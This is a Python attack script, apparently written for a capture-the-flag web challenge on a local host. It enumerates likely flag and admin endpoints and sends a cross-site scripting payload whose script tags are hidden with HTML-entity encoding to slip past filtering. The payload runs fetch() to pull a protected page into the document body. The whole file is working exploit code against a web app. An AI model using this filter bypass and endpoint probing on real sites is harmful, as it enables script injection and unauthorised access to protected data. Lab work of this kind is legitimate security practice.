import requests
import re

target = "http://127.0.0.1:32889"

# Working bypass pattern
bypass_template = "&lt;&#115;&#99;&#114;&#105;&#112;&#116;&gt;{code}&lt;/&#115;&#99;&#114;&#105;&#112;&#116;&gt;"

# Try to make requests to different endpoints
endpoints_to_try = [
    "/flag",
    "/api/flag",
    "/get_flag",
    "/xss",
    "/admin",
    "/success",
    "/validate",
]

print("Checking if other endpoints exist...")
print("="*80)

for endpoint in endpoints_to_try:
    try:
        response = requests.get(f"{target}{endpoint}", timeout=5)
        print(f"\n{endpoint}")
        print(f"  Status: {response.status_code} | Length: {len(response.content)} bytes")
        
        if response.status_code == 200:
            flags = re.findall(r'FLAG\{[^}]+\}', response.text)
            if flags:
                print(f"  *** FLAG FOUND: {flags[0]} ***")
                print(f"  Response: {response.text}")
            else:
                print(f"  Snippet: {response.text[:200]}")
                
    except Exception as e:
        print(f"  ERROR: {str(e)}")

print("\n" + "="*80)

# Also try the XSS payload that fetches an endpoint
print("\nTrying XSS that fetches endpoints...")
for endpoint in ["/flag", "/success"]:
    code = f"fetch('{endpoint}').then(r=>r.text()).then(t=>document.body.innerHTML=t)"
    payload = bypass_template.format(code=code)
    
    try:
        response = requests.get(f"{target}/page", params={'name': payload}, timeout=5)
        print(f"\nXSS fetch to {endpoint}")
        print(f"  Length: {len(response.content)} bytes")
        
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flags:
            print(f"  *** FLAG FOUND: {flags[0]} ***")
            
    except Exception as e:
        print(f"  ERROR: {str(e)}")

print("\n" + "="*80)

